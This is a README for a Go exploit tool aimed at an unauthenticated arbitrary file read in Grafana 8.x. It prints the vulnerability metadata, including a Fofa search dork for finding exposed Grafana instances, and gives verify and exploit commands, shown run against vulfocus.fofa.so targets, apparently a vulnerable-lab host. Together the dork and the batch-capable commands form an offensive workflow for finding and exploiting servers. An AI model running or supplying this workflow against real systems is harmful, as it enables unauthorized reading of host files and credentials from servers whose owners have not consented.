# GrafanaArbitraryFileRead

## Usage

### 1. show info

```bash
❯ go run main.go -s                                               
[INF] VulnInfo:
{
  "Name": "Grafana Arbitrary File Read",
  "VulID": "nil",
  "Version": "1.0",
  "Author": "z3",
  "VulDate": "2021-12-07",
  "References": [
    "https://nosec.org/home/detail/4914.html"
  ],
  "AppName": "Grafana",
  "AppPowerLink": "https://grafana.com/",
  "AppVersion": "Grafana Version 8.*",
  "VulType": "Arbitrary File Read",
  "Description": "An unauthorized arbitrary file reading vulnerability exists in Grafana, which can be exploited by an attacker to read arbitrary files on the host computer without authentication.",
  "Category": "REMOTE",
  "Dork": {
    "Fofa": "app=\"Grafana\"",
    "Quake": "",
    "Zoomeye": "",
    "Shodan": ""
  }
}%     
```

### 2. verify

```bash
echo vulfocus.fofa.so:55628 | go run main.go -v -t 20
http://vulfocus.fofa.so:55628
```

### 3. exploit

```bash
echo http://vulfocus.fofa.so:51766 | go run main.go -m exploit -v
```